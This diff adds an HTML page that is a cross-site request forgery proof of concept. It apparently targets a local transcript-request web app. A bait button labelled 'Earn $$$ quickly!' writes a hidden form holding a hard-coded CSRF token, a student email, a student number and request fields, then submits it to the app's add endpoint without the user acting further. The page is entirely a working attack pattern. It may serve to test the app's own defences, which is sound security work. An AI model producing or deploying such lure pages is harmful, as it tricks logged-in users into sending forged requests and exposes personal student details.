@@ -1,0 +1,18 @@
+<html>
+
+<body>
+<button id="btn" onclick="sendFunction()">Earn $$$ quickly!</button>
+
+						
+</body>
+
+<script>
+var send = document.getElementById("btn");
+//send.onclick = sendFunction();
+function sendFunction() {
+	document.write('<form id="form" method="POST" action="http://localhost/TranskripRequest/add"><input type="hidden" name="csrf_token" value="15abbd0cec48d5b00362062d8defcf9b" /><input type="email" name="requestByEmail" value="7315028@student.unpar.ac.id" readonly="readonly"/><input type="text" value="2015730028" readonly="readonly"/><input type="text" name="requestByName" value="meme" readonly="readonly"/><select name="requestType"><option value="DPS_ID" selected>DPS Bahasa Indonesia (Seluruh Semester)</option><option value="DPS_EN">DPS Bahasa Inggris (Seluruh Semester)</option><option value="LHS">LHS (Semester Terakhir)</option></select><input type="text" name="requestUsage" value="bla"/><input type="submit" class="button" value="Kirim Permohonan"></form>');
+    document.getElementById("form").submit();
+}
+</script>
+</script>
+</html>
